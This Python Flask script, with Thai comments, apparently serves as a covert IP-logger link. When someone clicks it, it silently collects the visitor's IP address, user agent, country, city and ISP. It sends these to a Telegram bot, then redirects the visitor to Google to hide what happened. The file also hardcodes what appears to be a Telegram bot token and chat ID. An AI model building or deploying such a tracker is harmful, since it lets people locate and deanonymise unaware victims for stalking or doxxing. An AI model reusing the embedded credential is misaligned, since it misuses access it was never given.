from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# ฟังก์ชันส่งแจ้งเตือนเข้า Telegram
def send_telegram_alert(msg):
    token = "8827060061:AAHCAtyCdFcVX84EUb_svcCIAChZRtKYJ7c"
    chat_id = "8386956572"
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=4)
    except:
        pass

# ฟังก์ชันเช็คพิกัดและ ISP จาก IP
def get_geo_info(ip):
    if ip.startswith(('127.', '192.168.', '10.')) or ip == 'localhost':
        return {"status": "private"}
    
    url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query"
    try:
        res = requests.get(url, timeout=5)
        return res.json()
    except:
        return {"status": "fail"}

@app.route('/')
def home():
    # ดึง IP จริงผ่าน Cloud Proxy Header
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    geo = get_geo_info(user_ip)
    
    country = geo.get('country', 'N/A')
    region = geo.get('regionName', '')
    city = geo.get('city', '')
    isp = geo.get('isp', 'N/A')
    org = geo.get('org', '')

    # จัดรูปแบบข้อความแจ้งเตือน
    alert_text = (
        f"🚨 มีคนกดเปิดลิงก์!\n"
        f"🌐 IP: {user_ip}\n"
        f"📍 พิกัด: {country} ({region}, {city})\n"
        f"🏢 ISP: {isp} / {org}\n"
        f"📱 อุปกรณ์: {user_agent[:60]}..."
    )
    
    # ส่งข้อความเข้า Telegram ทันที
    send_telegram_alert(alert_text)
    
    # ส่งผู้ใช้ไปยัง Google ทันที
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)